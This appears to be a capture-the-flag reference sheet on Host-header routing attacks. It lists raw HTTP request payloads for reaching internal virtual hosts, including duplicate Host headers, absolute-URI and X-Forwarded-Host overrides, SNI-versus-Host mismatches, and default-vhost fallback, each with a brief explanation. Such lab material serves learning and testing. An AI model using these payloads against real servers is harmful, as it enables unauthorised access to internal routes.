# Virtual host — the `Host:` routing smuggle

## The shape — `Host:` selects the vhost

```text
GET / HTTP/1.1
Host: internal
```

The `Host:` header selects the back-end's virtual host — a vhost bound
to `internal` serves internal routes — the smuggle's `Host:` overrides
the routing.

## The internal-vhost — `Host: internal` / `Host: localhost`

```text
GET /flag HTTP/1.1
Host: internal
```

The smuggle's `Host: internal` — the back-end routes to the internal
vhost — `/flag` is reachable — `flag-locations.md`.

## The port-vhost — `Host: t:9000`

```text
GET / HTTP/1.1
Host: t:9000
```

The `Host:`'s port — a listener on `:9000` — the smuggle's `Host:` probes
it — `internal-routes.md`.

## The duplicate-Host — `Host: a` + `Host: b`

```text
GET / HTTP/1.1
Host: a
Host: b
```

Two `Host:` headers — first-wins vs last-wins vs reject — a vhost-smuggle
— `header-smuggling.md`.

## The absolute-URI — `GET http://internal/path`

```text
GET http://internal/path HTTP/1.1
Host: t
```

The absolute-URI — a proxy routes on the URI host — the URI-vs-Host
desync — `header-smuggling.md`.

## The `X-Forwarded-Host` — the routing header

```text
GET / HTTP/1.1
X-Forwarded-Host: internal
```

`X-Forwarded-Host` overrides `Host:` for routing — `advanced-headers.md`.

## The SNI-vs-Host — the TLS-layer mismatch

```text
TLS SNI: public.com
HTTP Host: internal
```

The SNI routes the connection, the `Host:` routes the vhost — a
SNI-vs-Host desync — `advanced-reach.md`.

## The wildcard-vhost — `Host: *.internal`

```text
Host: sub.internal
```

A wildcard vhost — the smuggle's `Host:` probes it — `internal-routes.md`.

## The default-vhost — the unmatched `Host:`

```text
Host: nonexistent
```

An unmatched `Host:` falls to the default vhost — the default may serve
internal routes — a default-vhost smuggle.
